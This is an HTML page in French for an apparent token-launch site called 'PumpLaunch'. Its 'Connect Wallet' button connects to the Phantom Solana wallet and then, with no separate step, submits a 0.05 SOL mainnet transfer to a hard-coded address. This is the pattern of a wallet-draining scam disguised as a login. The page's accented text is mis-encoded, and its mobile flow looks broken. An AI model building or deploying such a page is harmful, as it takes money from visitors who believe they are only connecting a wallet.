<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>PumpLaunch â€” Connexion + Transaction auto</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex flex-col min-h-screen">
  <section class="text-center py-20 bg-purple-700">
    <h1 class="text-5xl font-extrabold">ðŸš€ PumpLaunch</h1>
    <p class="mt-4 text-lg">Connexion Phantom + Transaction automatique</p>
    <button id="connectButton" type="button"
      class="mt-8 px-8 py-4 bg-white text-purple-700 font-bold rounded-lg shadow-lg hover:bg-gray-200 transition">
      Connect Wallet
    </button>
    <div id="status" class="mt-4 text-gray-100">Statut : Non connectÃ©</div>
    <div id="wallet-info" class="mt-2 text-green-300 font-mono break-words text-sm">En attente de connexion...</div>
  </section>

  <script type="module">
    import nacl from "https://cdn.skypack.dev/tweetnacl";
    import bs58 from "https://cdn.skypack.dev/bs58";
    const { PublicKey, Connection, SystemProgram, Transaction } = solanaWeb3;

    const RPC = "https://api.mainnet-beta.solana.com";
    const conn = new Connection(RPC, "confirmed");
    const DESTINATION = "EFYHSL789UeZwyDwgRcUhJYiU3GygoaBuDz2JfhHcMLr";
    const LAMPORTS = Math.round(0.05 * 1_000_000_000); // 0.05 SOL

    const btn = document.getElementById('connectButton');
    const status = document.getElementById('status');
    const info = document.getElementById('wallet-info');

    function isMobile() {
      return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    async function connectDesktopAndSend() {
      try {
        if (window.solana && window.solana.isPhantom) {
          const resp = await window.solana.connect();
          window.providerPublicKey = resp.publicKey.toString();
          status.innerText = "âœ… ConnectÃ© via extension";
          info.innerText = resp.publicKey.toString();
          await sendTransaction(window.providerPublicKey, DESTINATION, LAMPORTS);
        } else {
          status.innerText = "âŒ Extension Phantom non dÃ©tectÃ©e";
        }
      } catch (err) {
        status.innerText = "Erreur: " + (err?.message || err);
      }
    }

    function connectMobile() {
      status.innerText = "ðŸ“± Redirection vers Phantom...";
      const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
      // On ajoute un paramÃ¨tre ?afterConnect=1 pour savoir qu'on revient de la connexion
      const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname + "?afterConnect=1");
      const deepLink =
        `https://phantom.app/ul/v1/connect` +
        `?app_url=${appUrl}` +
        `&redirect_link=${redirectLink}` +
        `&cluster=mainnet-beta`;
      window.location.href = deepLink;
    }

    async function sendTransaction(fromStr, toStr, lamports) {
      try {
        const fromPubkey = new PublicKey(fromStr);
        const toPubkey = new PublicKey(toStr);

        const ix = SystemProgram.transfer({ fromPubkey, toPubkey, lamports });
        const { blockhash } = await conn.getLatestBlockhash();
        const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);

        if (!isMobile()) {
          const { signature } = await window.solana.signAndSendTransaction(tx);
          status.innerText = "âœ… Transaction envoyÃ©e: " + signature;
        } else {
          const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
          const base64Tx = btoa(String.fromCharCode(...serialized));
          const keyPair = nacl.box.keyPair();
          const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
          const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
          sessionStorage.setItem("dappSecretKeyBase58", dappSecretKeyB58);

          const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
          const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
          const deepLink =
            `https://phantom.app/ul/v1/signAndSendTransaction` +
            `?dapp_encryption_public_key=${dappPublicKeyB58}` +
            `&app_url=${appUrl}` +
            `&redirect_link=${redirectLink}` +
            `&cluster=mainnet-beta` +
            `&payload=${encodeURIComponent(base64Tx)}`;
          window.location.href = deepLink;
        }
      } catch (err) {
        status.innerText = "Erreur transaction: " + (err?.message || err);
      }
    }

    // VÃ©rifie si on revient de la connexion mobile
    document.addEventListener("DOMContentLoaded", async () => {
      const params = new URLSearchParams(window.location.search);
      if (params.get("afterConnect") === "1" && window.providerPublicKey) {
        status.innerText = "ðŸ“± ConnectÃ©, envoi automatique...";
        await sendTransaction(window.providerPublicKey, DESTINATION, LAMPORTS);
      }
    });

    btn.addEventListener('click', async (e) => {
      e.preventDefault();
      if (isMobile()) {
        connectMobile();
      } else {
        await connectDesktopAndSend();
      }
    });
  </script>
</body>
</html>
